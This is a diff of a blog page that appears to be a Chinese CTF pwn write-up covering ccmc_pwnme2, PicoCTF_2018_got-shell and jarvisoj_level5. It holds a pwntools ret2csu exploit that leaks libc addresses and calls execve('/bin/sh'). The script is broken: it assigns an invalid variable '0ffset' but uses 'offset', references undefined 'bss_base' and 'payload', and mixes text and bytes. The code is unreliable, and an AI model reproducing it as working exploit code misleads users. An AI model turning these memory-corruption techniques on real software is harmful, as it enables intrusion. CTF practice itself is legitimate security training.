@@ -16,7 +16,7 @@
     <meta name="description" content="" />
     
     <title>
-      ccmc_pwnme2 - Rin
+      week3-2.2 - Rin
     </title>
     <link rel="manifest" href="/manifest.json" />
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
@@ -26,6 +26,11 @@
   <meta name="generator" content="Hexo 5.4.0"></head>
   <body>
     <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#ccmc-pwnme2"><span class="toc-text">ccmc_pwnme2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PicoCTF-2018-got-shell"><span class="toc-text">PicoCTF_2018_got-shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jarvisoj-level5"><span class="toc-text">jarvisoj_level5</span></a></li></ol>
+    </div>
     
     <div id="fixed-menu-wrap">
       <span class="iconfont icon-sousuo search-box menu-reset"></span>
@@ -130,7 +135,7 @@
         <article class="post-entry">
     <div class="header">
       
-      <div class="title">ccmc_pwnme2</div>
+      <div class="title">week3-2.2</div>
       <div class="meta">
         <span class="item">
           <span class="iconfont icon-time-circle"></span>
@@ -157,7 +162,8 @@
       <div>
       </div>
     </div>
-    <html><head></head><body><p>​        一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>
+    <html><head></head><body><p>​    </p>
+<h4 id="ccmc-pwnme2">ccmc_pwnme2<a class="post-anchor" href="#ccmc-pwnme2"></a></h4><p>一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>
 <p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>
 <pre><code class="python">from pwn import *
 p = remote('node4.buuoj.cn',27653)
@@ -178,13 +184,80 @@ p.interactive()
 </code></pre>
 <p>​    </p>
 <p>​    ps：感觉还需要再多做一些rop</p>
+<h4 id="PicoCTF-2018-got-shell">PicoCTF_2018_got-shell<a class="post-anchor" href="#PicoCTF-2018-got-shell"></a></h4><p>​        虽然但是，这个题为什么这么pwncollege。guide的风格，函数的名字。。。完全一致好吧。</p>
+<p>​        可以写4字节，正好可以修改got表为后门函数。那就修改puts咯？</p>
+<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%889.16.16.png" data-caption="截屏2022-03-16 下午9.16.16" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-16%20%E4%B8%8B%E5%8D%889.16.16.png" alt="截屏2022-03-16 下午9.16.16"></a></p>
+<p>​            美丽畅畅的暴击（只要我不尴尬，尴尬的就是。）</p>
+<h4 id="jarvisoj-level5">jarvisoj_level5<a class="post-anchor" href="#jarvisoj-level5"></a></h4><p>​        这个题吧，我好像以前做过，是个纯纯的ret2csu的板子题。</p>
+<pre><code class="python">from pwn import*
+from LibcSearcher import LibcSearcher
+
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+#libc = ELF("")
+elf = ELF("./level3_x64")
+p = process("./level3_x64")
+
+0ffset = 0x88#(test)
+
+
+csu_front_addr = 0x400690
+csu_end_addr = 0x4006AA
+
+puts_plt = elf.plt['puts']
+libc_start_main_got = elf.got['__libc_start_main']
+main = elf.symbols['main']
+
+write_got = elf.got['write']
+read_got = elf.got['read']
+main_addr = elf.symbols['main']
+
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = b'a' * offset 
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += 'a' * (offset - 0x48)
+    payload += p64(last)
+    p.send(payload)
+    sleep(1)
+
+csu(0, 1, write_got, 8, write_got, 1, main_addr)
+write_addr = u64(p.recv(8))
+
+libc = LibcSearcher('write', write_addr)
+libc_base = write_addr - libc.dump('write')
+execve_addr = libc_base + libc.dump('execve')
+log.success('execve_addr ' + hex(execve_addr))
+'''
+libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
+libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+log.success('system_addr ' + hex(system_addr))
+'''
+csu(0, 1, read_got, 16, bss_base, 0, main_addr)
+p.send(p64(execve_addr) + '/bin/sh\x00')
+
+p.recvuntil('Hello, World\n')
+## execve(bss_base+8)
+csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
 </body></html>
 
   
   <div class="post-guide">
     <div class="item left">
-        
-          <a href="../week3-2.3/">ccmc_pwnme2</a>
         
     </div>
     <div class="item right">
